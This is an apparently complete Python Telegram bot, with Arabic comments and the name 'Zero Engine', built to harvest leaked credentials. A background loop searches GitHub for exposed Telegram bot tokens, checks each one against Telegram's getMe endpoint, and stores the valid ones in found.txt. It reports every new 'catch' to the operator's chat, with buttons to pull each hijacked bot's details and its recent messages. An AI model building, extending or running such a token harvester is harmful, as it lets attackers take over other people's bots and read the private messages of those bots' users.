import os, requests, threading, time, telebot
from telebot import types
from scanner import search_for_tokens
from controller import get_bot_info, get_bot_messages

# إعدادات البوت
BOT_TOKEN = os.getenv('REPORT_BOT_TOKEN')
CHAT_ID = os.getenv('CHAT_ID')
GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
FOUND_FILE = "found.txt"

bot = telebot.TeleBot(BOT_TOKEN)

# --- نظام الكيبورد التفاعلي ---
def get_markup(token):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📋 معلومات البوت", callback_data=f"info|{token}"))
    markup.add(types.InlineKeyboardButton("📩 آخر الرسائل", callback_data=f"msg|{token}"))
    markup.add(types.InlineKeyboardButton("📤 تصدير الملف", callback_data="export"))
    return markup

# --- معالجة الأوامر النصية (/start, /get_tokens) ---
@bot.message_handler(func=lambda message: True)
def handle_text(message):
    if str(message.chat.id) != str(CHAT_ID):
        return

    if message.text == "/start":
        bot.reply_to(message, "Zero Engine: البوت يعمل بكامل طاقته. أنتظر صيداً جديداً...")
    
    elif message.text == "/get_tokens":
        if os.path.exists(FOUND_FILE) and os.path.getsize(FOUND_FILE) > 0:
            with open(FOUND_FILE, "rb") as f:
                bot.send_document(message.chat.id, f)
        else:
            bot.reply_to(message, "⚠️ الملف فارغ حالياً.")

# --- معالجة الضغط على الخانات ---
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if str(call.message.chat.id) != str(CHAT_ID): return
    
    if call.data == "export":
        if os.path.exists(FOUND_FILE):
            with open(FOUND_FILE, "rb") as f:
                bot.send_document(CHAT_ID, f)
        return

    try:
        action, token = call.data.split("|")
        res = get_bot_info(token) if action == "info" else get_bot_messages(token)
        bot.send_message(CHAT_ID, f"نتائج {action}:\n{res[:4000]}")
    except Exception as e:
        bot.send_message(CHAT_ID, f"خطأ في معالجة الطلب: {e}")

# --- محرك الصيد ---
def run_scanner():
    while True:
        try:
            tokens = search_for_tokens(GITHUB_TOKEN)
            for token in tokens:
                if not os.path.exists(FOUND_FILE) or token not in open(FOUND_FILE).read():
                    if requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=5).status_code == 200:
                        bot.send_message(CHAT_ID, f"🔥 صيد جديد:\n`{token}`", 
                                         parse_mode="Markdown", reply_markup=get_markup(token))
                        with open(FOUND_FILE, "a") as f: f.write(token + "\n")
        except: pass
        time.sleep(60)

# --- التشغيل الأساسي ---
def run_manual_polling():
    last_update_id = 0
    while True:
        try:
            updates = bot.get_updates(offset=last_update_id + 1, timeout=20)
            for update in updates:
                last_update_id = update.update_id
                bot.process_new_updates([update])
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    try:
        bot.delete_webhook()
    except: pass
    
    threading.Thread(target=run_scanner, daemon=True).start()
    print("Zero Engine: Online & Stable")
    run_manual_polling()
